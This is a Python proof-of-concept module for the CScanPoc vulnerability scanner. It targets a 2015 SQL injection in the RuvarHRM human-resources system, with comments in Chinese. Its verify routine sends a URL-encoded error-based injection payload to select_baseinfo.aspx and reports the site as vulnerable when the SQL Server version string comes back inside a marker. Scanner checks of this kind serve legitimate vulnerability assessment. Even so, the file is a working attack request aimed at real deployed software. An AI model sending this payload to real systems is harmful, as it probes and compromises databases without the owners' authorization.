# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'RuvarHRM_0001'  # 平台漏洞编号，留空
    name = '璐华人力资源管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-30'  # 漏洞公布时间
    desc = '''
        广州市璐华计算机科技有限公司是一家eHR系统,人力资源管理软件,eHR系统,人事管理软件,eHR软件,人力资源管理系统,广州OA,政府OA软件开发商。
        璐华人力资源管理系统（RuvarHRM）在 /RuvarHRM/web_include/select_baseinfo.aspx 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0150075'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'RuvarHRM'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e1d5725f-9389-4847-b046-cee7cad30b1d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2015-0150075
            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            payload = "/RuvarHRM/web_include/select_baseinfo.aspx?bt_name=1%27)AND%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)%3E0--"
            url = arg + payload
            code, head, res, errcode, finalurl = hh.http(url)
            if code != 0 and "GAO JI@Microsoft SQL Server" in res:
                #security_hole('find sql injection: ' + arg)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
